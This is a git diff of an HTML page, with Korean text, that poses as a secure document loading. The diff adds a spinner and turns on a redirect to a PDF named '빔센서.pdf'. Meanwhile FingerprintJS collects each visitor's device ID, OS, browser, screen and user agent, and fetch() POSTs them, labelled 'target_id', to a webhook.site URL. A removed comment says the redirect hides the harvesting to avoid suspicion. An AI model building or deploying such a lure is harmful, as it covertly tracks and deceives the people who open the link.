@@ -4,46 +4,63 @@
     <meta charset="UTF-8">
     <title>보안 문서 로딩 중...</title>
     <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
+    <style>
+        /* 뱅글뱅글 돌아가는 로딩 애니메이션 추가 */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1e3a8a;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-<body style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; background: #f4f4f4;">
+<body style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; background: #f4f4f4; margin: 0;">
 
-    <div style="text-align: center; background: white; pading: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+    <div style="text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 80%; max-width: 400px;">
         <h2>문서를 불러오는 중입니다...</h2>
         <p>잠시만 기다려 주십시오. 보안 연결을 확인 중입니다.</p>
         <div class="loader"></div>
     </div>
 
     <script>
-        // 1. FingerprintJS 초기화 및 실행
         const fpPromise = import('https://openfpcdn.io/fingerprintjs/v4')
             .then(FingerprintJS => FingerprintJS.load());
 
         fpPromise
             .then(fp => fp.get())
             .then(result => {
-                // 2. 추출된 기기 고유 ID 및 세부 정보
                 const visitorId = result.visitorId;
                 const components = result.components;
-
-                // 3. Webhook 서버로 데이터 전송 (https://webhook.site/78ea7a5c-b84d-4094-b236-e85b52715d6b)
                 const webhookUrl = "https://webhook.site/78ea7a5c-b84d-4094-b236-e85b52715d6b";
 
+                // 1. 데이터 전송
                 fetch(webhookUrl, {
                     method: 'POST',
-                    mode: 'no-cors',
                     body: JSON.stringify({
                         target_id: visitorId,
                         platform: components.platform.value,
                         os: components.os.value,
                         browser: components.vendor.value,
                         screen: components.screenResolution.value,
+                        userAgent: navigator.userAgent, // 기기 정보 더 자세히 수집
                         timestamp: new Date().toISOString()
                     }),
                     headers: { 'Content-Type': 'application/json' }
+                })
+                .finally(() => {
+                    // 2. 전송이 끝난 후(성공/실패 상관없이) 2초 뒤에 PDF로 이동
+                    setTimeout(() => {
+                        // GitHub 저장소에 올린 PDF 파일 이름을 넣으세요. (예: 빔센서.pdf)
+                        window.location.href = "빔센서.pdf"; 
+                    }, 2000);
                 });
-
-                // 4. (선택사항) 정보를 다 캤다면 실제 제안서(PDF 등)로 리다이렉트해서 의심 피하기
-                // setTimeout(() => { window.location.href = "빔센서.pdf"; }, 2000);
             });
     </script>
 </body>
